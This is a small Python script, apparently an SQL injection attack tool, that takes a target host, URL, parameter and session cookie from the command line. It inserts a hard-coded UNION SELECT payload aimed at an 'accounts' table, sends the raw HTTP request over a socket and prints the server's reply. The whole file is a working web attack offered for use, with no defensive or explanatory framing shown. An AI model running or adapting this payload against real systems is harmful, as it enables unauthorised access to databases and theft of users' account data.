import socket
import argparse
import urllib.parse

def get_request(HOST, URL, parameter, SQL_injection, COOKIE):
    injection_encoded = urllib.parse.quote_plus(SQL_injection)
    request = ("GET "+ URL.replace(parameter+"=",parameter+"="+injection_encoded) +"\r\n" 
                "Host: "+HOST+"\r\n" 
                "User-Agent: Mozilla/5.0 \r\n"
                "Accept: text/html,application/xhtml+xml,application/xml \r\n"
                "Accept-Language: en-US,en;q=0.5 \r\n"
                "Connection: keep-alive \r\n"
                "Cookie: "+COOKIE+" \r\n")
               
    return request
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', help='IP-address of server')
    parser.add_argument('-u', help='URL')
    parser.add_argument('--param', help='Query String Parameter')
    parser.add_argument('--cookie', help='Session Cookie')
    args = parser.parse_args()
    HOST = args.host
    URL = args.u
    PARAMETER = args.param
    COOKIE = args.cookie
    SQL_injection = ' \'UNION SELECT * FROM accounts where \'1\'=\'1'
    PORT = 80        
                    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
        tcp_socket.connect((HOST, PORT))
        request = get_request(HOST, URL, PARAMETER, SQL_injection, COOKIE)
        print(request)
        tcp_socket.sendall(request.encode())
        while True:
            data = tcp_socket.recv(1024)
            print(data)
            if not data:
                break
        
main()
